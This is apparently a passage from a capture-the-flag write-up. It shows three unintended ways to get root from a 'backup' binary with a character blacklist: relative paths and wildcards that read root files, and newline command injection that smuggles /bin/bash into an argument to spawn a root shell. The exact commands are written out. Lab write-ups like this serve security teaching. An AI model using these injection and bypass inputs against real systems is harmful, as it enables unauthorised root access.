# Unintended way to get root.txt

After we know that there are blacklisted characters on the _backup_ binary, we can bypass these with different methods.

### Method 1 - Using relative paths

When changing the directory to _/_ and execute the command again from there because it uses a **relative path** and bypasses the backslash character:
```markdown
backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 root
```

This outputs a Base64-decoded string that we can decode and get ZIP archived data which we can unzip with the password from before and we get all files from the root directory!

### Method 2 - Using wildcards

When using **wildcard characters** it bypasses the blacklist:
```markdown
backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /r??t/roo?.txt
```

This outputs a Base64-decoded string that we can decode and get ZIP archived data which we can unzip with the password from before and we get root.txt!

### Method 3 - Command Injection

When inputting a **newline** at the third parameter and executing a command between the **newlines**:
```markdown
backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 "test
\> /bin/bash
\> test"
```

This also works:
```markdown
backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 "$(printf 'aaa\n/bin/bash\nbbb')
```

This instantly spawns a root shell!
